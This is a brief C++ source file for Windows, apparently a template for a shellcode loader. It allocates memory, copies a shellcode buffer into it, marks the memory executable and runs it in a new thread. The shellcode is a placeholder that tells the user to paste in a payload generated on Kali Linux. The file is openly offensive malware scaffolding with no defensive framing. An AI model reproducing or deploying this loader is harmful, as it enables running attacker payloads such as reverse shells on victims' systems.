#include<Windows.h>
#include<iostream>


unsigned char shellcode[] =
< put your shellcode here from kali linux >


int main()
{

	//allocate the memory
	LPVOID allocateMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	//copy the shellcode to allocate memory
	RtlMoveMemory(allocateMem, shellcode, sizeof(shellcode));

	//make it executable
	DWORD oldprotect = 0;
	VirtualProtect(allocateMem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);

	//execute it
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocateMem, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);


	return 0;
}
